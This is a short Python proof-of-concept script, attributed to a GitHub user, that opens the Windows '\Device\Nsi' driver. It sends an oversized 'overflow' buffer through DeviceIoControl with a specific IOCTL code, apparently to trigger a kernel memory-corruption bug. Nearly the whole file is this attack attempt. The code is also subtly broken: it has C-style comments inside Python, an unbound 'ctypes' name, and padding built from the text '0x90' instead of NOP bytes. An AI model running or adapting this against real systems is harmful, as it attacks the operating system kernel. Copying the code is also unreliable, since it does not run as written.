from ctypes import *
from ctypes.wintypes import *
import sys, struct, time
import os

/* Foraged together */
/* Charles Thomas Wallace Truscott or @r0ss1n1 publishing at github.com/r0ss1n1 */

MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
GENERIC_READ_WRITE = 0xC0000000
OPEN_EXISTING = 0x00000003
FILE_ATTRIBUTE_NORMAL = 0x00000080
LPDWORD = ctypes.POINTER(ctypes.wintypes.DWORD)
LPOVERLAPPED = ctypes.wintypes.LPVOID
DeviceIoControl = windll.kernel32.DeviceIoControl
DeviceIoControl.argtypes = (ctypes.wintypes.HANDLE,
                            ctypes.wintypes.DWORD,
                            ctypes.wintypes.LPVOID,
                            ctypes.wintypes.DWORD,
                            ctypes.wintypes.LPVOID,
                            ctypes.wintypes.DWORD,
                            LPDWORD,
                            LPOVERLAPPED
                            )
DeviceIoControl.restype = ctypes.wintypes.BOOL
CreateFile = windll.kernel32.CreateFileW
CreateFile.argtypes = (ctypes.wintypes.LPCWSTR,
                        ctypes.wintypes.DWORD,
                        ctypes.wintypes.DWORD,
                        ctypes.wintypes.LPVOID,
                        ctypes.wintypes.DWORD,
                        ctypes.wintypes.DWORD,
                        ctypes.wintypes.HANDLE
                        )
CreateFile.restype = ctypes.wintypes.HANDLE
def gethandle():

        lpFileName = "\\\\.\\Device\\Nsi"
        dwDesiredAccess = GENERIC_READ_WRITE
        dwShareMode = 0
        lpSecurityAttributes = 0
        dwCreationDisposition = OPEN_EXISTING
        dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL
        hTemplateFile = 0
        try:
                handle = CreateFile(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile)
        except WindowsError as e:
                print(e)
        if not handle or handle == -1:
                print("CreateFileW failed")
                print(WindowsError)
        print(handle)
        return handle
def main():
        overflow = "0x90".encode() * 200
        inBuffer = create_string_buffer(overflow)
        lpInBuffer = addressof(inBuffer)
        nInBufferSize = len(inBuffer) - 1
        lpOutBuffer = None
        nOutBufferSize = 0
        dwBytesReturned = ctypes.wintypes.DWORD(0)
        lpBytesReturned = ctypes.byref(dwBytesReturned)
        lpOverlapped = None
        dwDevice = gethandle()
        try:
                pwnd = DeviceIoControl(dwDevice, 0x0012001b, lpInBuffer, nInBufferSize, lpOutBuffer, nOutBufferSize, lpBytesReturned, lpOverlapped)
                print(pwnd)
                if pwnd == 0:
                        print(WindowsError)
        except WindowsError as e:
                print(e)
if __name__ == "__main__": main()
